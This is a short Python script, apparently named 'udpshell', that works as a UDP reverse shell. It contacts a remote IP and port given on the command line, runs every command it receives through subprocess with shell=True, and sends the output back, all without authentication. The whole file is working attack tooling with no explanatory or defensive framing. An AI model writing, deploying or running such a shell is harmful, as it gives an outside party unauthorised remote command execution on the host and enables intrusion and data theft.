#!/usr/bin/python

import socket
import subprocess
import sys
from random import randint

#receive data, send to popen, send back

if(len(sys.argv) < 2):
	print("Usage: ./udpshell <send_ip> <send_port>")
	exit(1)

recv_ip = "0.0.0.0" 
recv_port = randint(1024, 65535)

send_ip = sys.argv[1] #127.0.0.1
send_port = int(sys.argv[2]) #5005

#print("Your client should be: python udpclient.py " + sys.argv[3] + " " + sys.argv[2] + " " + sys.argv[1])

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
sock.bind((recv_ip, recv_port))

#sock2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP

sock.sendto("Begin Connection id: 3242", (send_ip, send_port))

while True:
	command, addr = sock.recvfrom(1024) # buffer size is 1024 bytes
	if(command == "exit"):
		break
	proc = subprocess.Popen([command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	output = proc.stdout.read() + proc.stderr.read()
	sock.sendto(output, (send_ip, send_port))
